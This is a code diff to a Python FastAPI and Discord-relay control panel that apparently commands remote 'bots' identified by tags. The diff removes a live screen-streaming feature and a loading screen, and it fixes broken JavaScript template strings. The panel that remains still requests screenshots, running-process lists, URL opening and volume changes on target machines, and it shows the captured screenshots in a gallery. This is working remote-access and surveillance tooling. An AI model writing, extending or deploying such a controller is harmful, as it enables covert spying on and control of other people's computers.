@@ -240,7 +240,6 @@ async def on_message(message: discord.Message):
                 await tag_ch.send(f"Discovered receiver tag: {tag}")
             except Exception as exc:
                 print(f"[TAG] failed to broadcast {tag}: {exc}")
-        is_live_frame = "LIVE_STREAM_FRAME" in (message.content or "")
         payload = {
             "type": "text",
             "author": str(message.author),
@@ -248,13 +247,9 @@ async def on_message(message: discord.Message):
             "attachments": [],
             "ts": message.created_at.isoformat(),
             "tag": tag,
-            "is_live_frame": is_live_frame,
         }
         # Save any attachments (e.g., screenshot.png)
         for att in message.attachments:
-            if is_live_frame:
-                payload["attachments"].append({"filename": att.filename, "url": att.url})
-                continue
             try:
                 b = await att.read()
                 fname = f"{att.id}_{att.filename}"
@@ -328,8 +323,6 @@ PANEL_HTML = r"""<!doctype html>
     .live-frame .muted{position:absolute; inset:auto; margin:auto; text-align:center; color:var(--muted);}
     .live-controls{gap:6px; flex-wrap:wrap;} .input-compact{max-width:90px;}
     .scroll-card{max-height:70vh; overflow:auto;}
-    .loader{position:fixed; inset:0; display:flex; align-items:center; justify-content:center; background:#080510; z-index:200; transition:opacity .3s ease, visibility .3s ease;} .loader.hide{opacity:0; visibility:hidden;} .load-bar{width:240px; height:10px; border-radius:999px; background:rgba(255,255,255,.08); overflow:hidden; box-shadow:0 0 20px rgba(181,116,255,.35);} .load-bar span{display:block; height:100%; width:60%; background:linear-gradient(120deg,var(--accent),var(--accent2)); border-radius:999px; animation:slide 1.2s ease-in-out infinite;}
-    @keyframes slide{0%{transform:translateX(-70%);} 50%{transform:translateX(30%);} 100%{transform:translateX(140%);}}
     @media(max-width:720px){
       body{font-size:14px;}
       .tab-btn{flex:1 0 auto;}
@@ -342,12 +335,6 @@ PANEL_HTML = r"""<!doctype html>
   </style>
 </head>
 <body>
-  <div id="loader" class="loader">
-    <div>
-      <div class="load-bar"><span></span></div>
-      <div id="loadPct" style="margin-top:10px; text-align:center; color:var(--muted); font-weight:700;">0%</div>
-    </div>
-  </div>
   <div class="page">
     <header class="hero">
       <div>
@@ -486,17 +473,14 @@ PANEL_HTML = r"""<!doctype html>
       uptime:document.getElementById('uptime'), tagActive:document.getElementById('tagActive'), tagInput:document.getElementById('tagInput'),
       tagList:document.getElementById('tagList'), liveStatus:document.getElementById('liveStatus'), liveDot:document.getElementById('liveDot'),
       liveFrame:document.getElementById('liveFrame'), liveGate:document.getElementById('liveGate'), liveBody:document.getElementById('liveBody'),
-      liveHint:document.getElementById('liveHint'), liveControls:document.getElementById('liveControls'), liveMonitor:document.getElementById('liveMonitor'),
-      loader:document.getElementById('loader')
+      liveHint:document.getElementById('liveHint'), liveControls:document.getElementById('liveControls'), liveMonitor:document.getElementById('liveMonitor')
     };
-    const defaultTag = "{BOT_TAG}";
+    const defaultTag = {BOT_TAG};
     let currentTag = defaultTag;
     let knownTags = new Set([currentTag]);
     let hasSelectedTag = false;
     let liveActive = false;
-    let startedAt = Date.now(); setInterval(()=>{ const s=((Date.now()-startedAt)/1000|0); const m=(s/60|0), ss=s%60; el.uptime.textContent=${String(m).padStart(2,'0')}:; },1000);
-    window.addEventListener('load', ()=> { el.loader?.classList.add('hide'); });
-
+    let startedAt = Date.now(); setInterval(()=>{ const s=((Date.now()-startedAt)/1000|0); const m=(s/60|0), ss=s%60; el.uptime.textContent=`${String(m).padStart(2,'0')}:${String(ss).padStart(2,'0')}`; },1000);
     function setStatus(ok){ el.dot.className='dot '+(ok?'ok':'bad'); el.stxt.textContent = ok ? 'Connected' : 'Reconnecting...'; }
     function toast(t){ const n=document.getElementById('toast'); n.textContent=t; n.style.opacity='1'; setTimeout(()=> n.style.opacity='0', 1600); }
 
@@ -525,9 +509,7 @@ PANEL_HTML = r"""<!doctype html>
     async function refreshTags(){ try{ const r = await fetch('/tags'); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; if(currentTag && currentTag!==defaultTag) hasSelectedTag=true; } catch(e){} renderTags(); updateLiveGate(); }
     async function chooseTag(){ const val=(el.tagInput?.value||'').trim(); if(!val){ toast('Enter a tag'); return; } currentTag = val; hasSelectedTag=true; try{ const r = await fetch('/tags/select?tag='+encodeURIComponent(val), {method:'POST'}); const data = await r.json().catch(()=>({})); if(data.tags) knownTags = new Set(data.tags); if(data.active) currentTag = data.active; toast('Now targeting '+currentTag); } catch(e){ toast('Could not set tag'); } renderTags(); updateLiveGate(); }
     function withTag(path){ const u=new URL(path, window.location.origin); if(currentTag) u.searchParams.set('tag', currentTag); return u.pathname + u.search; }
-    const tagRegex = /(^|\s)(\[[^\[\]
-
-]{2,32}\])/;
+    const tagRegex = /(^|\s)(\[[^\[\]\r\n]{2,32}\])/;
     function parseTag(text){ const m=(text||'').match(tagRegex); return m?m[2]:null; }
     function touchTagFromMessage(obj){
       const found = (obj&&obj.tag) || parseTag(obj&&obj.content);
@@ -539,7 +521,7 @@ PANEL_HTML = r"""<!doctype html>
       }
     }
 
-    function node(author, content, ts){ const d=document.createElement('div'); d.className='item'; const m=document.createElement('div'); m.className='meta'; const time=ts? new Date(ts).toLocaleString(): new Date().toLocaleString(); m.textContent = ${time} - ; const b=document.createElement('div'); b.textContent = content || ''; d.appendChild(m); d.appendChild(b); return d; }
+    function node(author, content, ts){ const d=document.createElement('div'); d.className='item'; const m=document.createElement('div'); m.className='meta'; const time=ts? new Date(ts).toLocaleString(): new Date().toLocaleString(); m.textContent = `${time} - ${author}`; const b=document.createElement('div'); b.textContent = content || ''; d.appendChild(m); d.appendChild(b); return d; }
     function addFeed(container, div, limit=200){ container.prepend(div); while(container.children.length>limit) container.lastChild.remove(); }
     function addShot(url){ if(!url) return; const wrap=document.createElement('div'); wrap.className='shot'; const img=document.createElement('img'); img.loading='lazy'; img.src=url; wrap.onclick=()=> window.open(url,'_blank'); wrap.appendChild(img); el.gallery.prepend(wrap); while(el.gallery.children.length>80) el.gallery.lastChild.remove(); }
     function addProc(text){ addFeed(el.procFeed, node('Processes', text, Date.now()), 120); }
@@ -547,7 +529,7 @@ PANEL_HTML = r"""<!doctype html>
 
     function setTab(id){
       ['live','shots','procs','logs'].forEach(t=>{
-        const view=document.getElementById(	ab-);
+        const view=document.getElementById(`tab-${t}`);
         const active=t===id;
         view.classList.toggle('active', active);
         view.setAttribute('aria-hidden', active?'false':'true');
@@ -557,13 +539,12 @@ PANEL_HTML = r"""<!doctype html>
     document.querySelectorAll('.tab-btn').forEach(btn=> btn.onclick = ()=> setTab(btn.dataset.tab));
 
     function setLiveStatus(text, state='idle'){ liveActive = state==='ok'; if(el.liveStatus) el.liveStatus.textContent=text; if(el.liveDot){ el.liveDot.className='dot'+(state==='ok'?' ok': state==='error'?' bad':''); } if(state!=='ok' && el.liveFrame){ el.liveFrame.removeAttribute('src'); const wrap=document.getElementById('liveFrameWrap'); if(wrap) wrap.classList.remove('active'); if(el.liveHint) el.liveHint.style.display='block'; } }
-    function handleLiveFrame(obj){ if(!(obj.attachments&&obj.attachments.length)) return; const url=obj.attachments[0].url+(obj.attachments[0].url.includes('?')?'&':'?')+'t='+(Date.now()); const wrap=document.getElementById('liveFrameWrap'); if(el.liveFrame){ el.liveFrame.src=url; if(wrap) wrap.classList.add('active'); el.liveFrame.style.display='block'; if(el.liveHint) el.liveHint.style.display='none'; el.liveFrame.onload=()=> wrap?.classList.add('active'); el.liveFrame.onerror=()=> setLiveStatus('Stream error', 'error'); } setLiveStatus('Receiving frames', 'ok'); }
-    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; const content=(obj.content||'').toUpperCase(); touchTagFromMessage(obj); const isLiveFrame=obj.is_live_frame===true || content.includes('LIVE_STREAM_FRAME'); const isLiveStopped=content.includes('LIVE_STREAM_STOPPED'); const isLiveError=content.includes('LIVE_STREAM_ERROR'); if(isLiveFrame){ handleLiveFrame(obj); return; } if(isLiveStopped){ setLiveStatus('Stopped', 'idle'); } if(isLiveError){ setLiveStatus('Stream error', 'error'); } const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if(obj.content && obj.content.toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
+    function connectWS(){ setStatus(false); const ws = new WebSocket((location.protocol==='https:'?'wss://':'ws://') + location.host + '/ws'); ws.onopen = ()=> setStatus(true); ws.onclose = ()=> { setStatus(false); setTimeout(connectWS, 1200); }; ws.onmessage = ev => { const obj = JSON.parse(ev.data); if(obj.type !== 'text') return; touchTagFromMessage(obj); const msg = node(obj.author, obj.content, obj.ts); addFeed(el.timeline, msg.cloneNode(true)); addLog(msg.cloneNode(true)); if((obj.content||'').toLowerCase().includes('filtered running processes')) addFeed(el.procFeed, msg.cloneNode(true)); if(obj.attachments && obj.attachments.length){ obj.attachments.forEach(a=> addShot(a.url)); } }; }
     connectWS(); refreshTags(); renderTags();
 
     async function post(path){ const r = await fetch(withTag(path),{method:'POST'}); const data = await r.json().catch(()=>({})); if(!r.ok) throw new Error(data.error||'Request failed'); return data; }
-    async function startLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); setTab('live'); updateLiveGate(); return; } const monitor=(el.liveMonitor?.value||'1'); setLiveStatus('Requesting stream...', 'pending'); try{ await post('/cmd/live/start?monitor='+encodeURIComponent(monitor)); toast('Live request sent (Discord relay)'); setLiveStatus('Waiting for frames...', 'pending'); } catch(e){ setLiveStatus('Start failed', 'error'); toast(e.message);} }
-    async function stopLiveStream(){ if(!hasSelectedTag){ toast('Select a bot first'); return; } try{ await post('/cmd/live/stop'); toast('Stop request sent'); setLiveStatus('Stopping...', 'pending'); } catch(e){ toast(e.message);} }
+    function startLiveStream(){ toast('Live streaming is disabled.'); setLiveStatus('Disabled', 'idle'); }
+    function stopLiveStream(){ toast('Live streaming is disabled.'); setLiveStatus('Disabled', 'idle'); }
     async function doShot(){ try{ await post('/cmd/ss'); toast('Screenshot requested'); } catch(e){ toast(e.message);} }
     async function doProcs(){ try{ await post('/cmd/ps'); toast('Process list requested'); } catch(e){ toast(e.message);} }
     async function openLink(){ const url=document.getElementById('openUrl').value.trim(); if(!url){toast('Enter a URL'); return;} const safe=(url.startsWith('http://')||url.startsWith('https://'))?url:'http://'+url; try{ await post('/cmd/open?url='+encodeURIComponent(safe)); toast('Open link sent'); } catch(e){ toast(e.message);} }
@@ -674,19 +655,6 @@ async def cmd_set_volume(pct: float = Query(100.0), tag: str = Query(None)):
         return JSONResponse({"ok": False, "error": "Invalid percent"}, status_code=400)
     await _send_cmd(f"{_resolve_tag(tag)} SET_VOLUME {pct_val}")
     return JSONResponse({"ok": True, "pct": pct_val})
-
-@app.post("/cmd/live/start")
-async def cmd_live_start(
-    monitor: int = Query(1, ge=1),
-    tag: str = Query(None),
-):
-    await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_START {monitor}")
-    return JSONResponse({"ok": True, "monitor": monitor, "mode": "discord"})
-
-@app.post("/cmd/live/stop")
-async def cmd_live_stop(tag: str = Query(None)):
-    await _send_cmd(f"{_resolve_tag(tag)} LIVE_STREAM_HTTP_STOP")
-    return JSONResponse({"ok": True})
 
 @app.post("/cmd/display_gif")
 async def cmd_display_gif(tag: str = Query(None)):
